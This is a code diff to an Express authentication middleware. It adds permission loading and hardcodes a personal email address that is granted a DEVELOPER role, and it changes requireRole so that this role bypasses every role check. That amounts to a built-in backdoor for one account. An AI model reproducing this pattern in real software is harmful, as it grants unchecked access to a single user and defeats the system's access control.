@@ -1,5 +1,13 @@
 import { verifyToken } from "../services/authService.js";
 import { pool } from "../config/db.js";
+import { getDefaultPermissions } from "../config/permissions.js";
+import { getUserPermissions } from "../controllers/rbacController.js";
+
+const DEVELOPER_EMAILS = new Set(["skaragher@gmail.com"]);
+
+function normalizeEmail(email) {
+  return String(email || "").trim().toLowerCase();
+}
 
 export async function requireAuth(req, res, next) {
   const authHeader = req.headers.authorization;
@@ -43,18 +51,29 @@ export async function requireAuth(req, res, next) {
     const roles = (Array.isArray(dbUser.roles) ? dbUser.roles : [])
       .map((r) => String(r || "").trim().toUpperCase())
       .filter(Boolean);
+    const baseRole = String(dbUser.role || "").trim().toUpperCase();
+    const finalRoles = roles.length ? roles : [baseRole].filter(Boolean);
+    const isDeveloper = DEVELOPER_EMAILS.has(normalizeEmail(dbUser.email));
+    const effectiveRoles = isDeveloper ? [...new Set(["DEVELOPER", ...finalRoles])] : finalRoles;
+    const effectiveRole = isDeveloper ? "DEVELOPER" : baseRole;
+
+    const [customPerms] = await Promise.all([getUserPermissions(userId)]);
+    const defaultPerms = getDefaultPermissions(effectiveRoles);
+    const permissions = [...new Set([...defaultPerms, ...customPerms])];
+
     req.user = {
       ...decoded,
       id: String(dbUser.id),
       fullName: dbUser.full_name,
       email: dbUser.email,
-      role: String(dbUser.role || "").trim().toUpperCase(),
-      roles: roles.length ? roles : [String(dbUser.role || "").trim().toUpperCase()].filter(Boolean),
+      role: effectiveRole,
+      roles: effectiveRoles,
       isActive: dbUser.is_active !== false,
       regionCode: dbUser.region_code ? String(dbUser.region_code).trim().toUpperCase() : null,
       districtCode: dbUser.district_code ? String(dbUser.district_code).trim().toUpperCase() : null,
       establishmentCode: dbUser.establishment_code ? String(dbUser.establishment_code).trim().toUpperCase() : null,
-      centerId: dbUser.center_id != null && Number.isInteger(Number(dbUser.center_id)) ? Number(dbUser.center_id) : null
+      centerId: dbUser.center_id != null && Number.isInteger(Number(dbUser.center_id)) ? Number(dbUser.center_id) : null,
+      permissions,
     };
     next();
   } catch {
@@ -64,7 +83,6 @@ export async function requireAuth(req, res, next) {
 
 export function requireRole(role) {
   return (req, res, next) => {
-    const expectedRoles = Array.isArray(role) ? role : [role];
     if (!req.user) {
       return res.status(403).json({ message: "Acces refuse" });
     }
@@ -74,8 +92,10 @@ export function requireRole(role) {
     const roles = Array.isArray(req.user.roles) && req.user.roles.length
       ? req.user.roles
       : [req.user.role].filter(Boolean);
-    const hasRole = roles.some((r) => expectedRoles.includes(r));
-    if (!hasRole) {
+    // DEVELOPER court-circuite tous les contrôles de rôle
+    if (roles.includes("DEVELOPER")) return next();
+    const expectedRoles = Array.isArray(role) ? role : [role];
+    if (!roles.some((r) => expectedRoles.includes(r))) {
       return res.status(403).json({ message: "Acces refuse" });
     }
     next();
